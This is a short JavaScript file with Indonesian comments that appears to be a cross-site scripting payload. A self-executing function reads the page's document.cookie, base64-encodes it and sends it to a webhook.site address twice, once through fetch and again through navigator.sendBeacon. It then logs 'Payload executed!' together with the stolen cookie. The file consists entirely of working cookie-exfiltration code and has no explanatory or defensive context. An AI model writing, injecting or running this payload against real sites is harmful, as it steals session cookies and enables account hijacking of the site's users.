(function() {
    // Mengirim cookie ke webhook
    fetch('https://webhook.site/0fa6ab36-5615-4c5d-9e7a-2f1d8cecbe65?cookie=' + btoa(document.cookie));
    
    // Alternative: gunakan navigator.sendBeacon untuk lebih reliable
    navigator.sendBeacon('https://webhook.site/0fa6ab36-5615-4c5d-9e7a-2f1d8cecbe65', 
        new URLSearchParams({
            cookie: document.cookie,
            encoded: btoa(document.cookie)
        })
    );
    
    // Log untuk debugging
    console.log("Payload executed!");
    console.log("Cookie:", document.cookie);
})();
